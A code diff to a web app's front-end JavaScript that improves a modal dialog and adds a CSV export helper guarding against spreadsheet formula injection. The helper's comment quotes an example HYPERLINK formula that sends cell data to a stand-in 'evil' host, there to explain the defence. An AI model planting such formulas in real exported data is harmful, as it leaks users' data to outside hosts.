@@ -198,22 +198,62 @@ function openModal({ title, body, foot, wide, xwide, onMount, onClose, dismissib
   // body/foot are templates built by callers; all dynamic values inside them
   // are esc()-encoded at the call site.
   overlay.innerHTML = `
-    <div class="modal${sizeClass}">
+    <div class="modal${sizeClass}" role="dialog" aria-modal="true">
       <div class="modal-head">
         <h3>${esc(title)}</h3>
-        ${dismissible ? '<button class="modal-close" data-close>×</button>' : ''}
+        ${dismissible ? '<button type="button" class="modal-close" data-close aria-label="Close">×</button>' : ''}
       </div>
-      <div class="modal-body">${body}</div>
+      <div class="modal-body">${body == null ? '' : body}</div>
       ${foot ? `<div class="modal-foot">${foot}</div>` : ''}
     </div>`;
-  if (typeof onClose === 'function') overlay._onCloseCleanup = onClose;
+  // Backdrop dismiss: pointerdown AND click both on the overlay (not the sheet).
+  // Bubble phase — avoids capture-phase pointerup races that dismiss a freshly
+  // opened sheet or leave a dimmed lockout. Still ignores focus-scroll landings
+  // where only the final click hits the dimmed area (parent-picker safe).
+  const openedAt = Date.now();
+  let backdropPointerDown = false;
+  overlay.addEventListener('pointerdown', (e) => {
+    backdropPointerDown = dismissible && e.target === overlay;
+  });
+  overlay.addEventListener('pointercancel', () => { backdropPointerDown = false; });
   overlay.addEventListener('click', (e) => {
     if (!dismissible) return;
-    if (e.target === overlay || e.target.hasAttribute('data-close')) closeModal();
+    if (e.target.closest('[data-close]')) {
+      closeModal();
+      return;
+    }
+    if (Date.now() - openedAt < 275) {
+      backdropPointerDown = false;
+      return;
+    }
+    if (e.target === overlay && backdropPointerDown) closeModal();
+    backdropPointerDown = false;
   });
+  const onKey = (e) => {
+    if (e.key !== 'Escape' || !dismissible) return;
+    const top = $('#modal-root')?.lastElementChild;
+    if (top !== overlay) return;
+    e.preventDefault();
+    closeModal();
+  };
+  document.addEventListener('keydown', onKey);
+  const userOnClose = typeof onClose === 'function' ? onClose : null;
+  overlay._onCloseCleanup = () => {
+    document.removeEventListener('keydown', onKey);
+    if (userOnClose) {
+      try { userOnClose(); } catch { /* ignore */ }
+    }
+  };
   document.body.classList.add('modal-open');
-  $('#modal-root').appendChild(overlay);
-  if (onMount) onMount(overlay);
+  const root = $('#modal-root');
+  if (!root) return overlay;
+  root.appendChild(overlay);
+  if (onMount) {
+    try { onMount(overlay); } catch (err) {
+      console.error(err);
+      try { toast(err.message || 'Modal failed to initialize', 'error'); } catch { /* ignore */ }
+    }
+  }
   return overlay;
 }
 /** Close the topmost modal. Pass `all=true` to clear the whole stack (default openModal). */
@@ -707,6 +747,20 @@ function parseCsv(text) {
 /* ---------- Multi-select toolbar filters (Network / Hardware / Employees) ---------- */
 function csvList(v) {
   return String(v || '').split(',').map((s) => s.trim()).filter(Boolean);
+}
+
+/**
+ * Neutralize spreadsheet formula injection in an exported CSV cell value.
+ * A leading = + - @ (or tab/CR) makes Excel/Sheets treat the cell as a formula,
+ * so a field like `=HYPERLINK("http://evil"&A1)` would execute on open. Prefix a
+ * single quote to force text — but leave plain numbers (incl. negatives / phone
+ * `+90…`) untouched so report figures aren't corrupted. Caller still wraps the
+ * result in quotes and doubles any embedded quotes.
+ */
+function csvCell(v) {
+  const s = String(v == null ? '' : v);
+  if (/^[=+\-@\t\r]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s)) return `'${s}`;
+  return s;
 }
 
 function multiSelectHtml({ id, allLabel, selected, options }) {
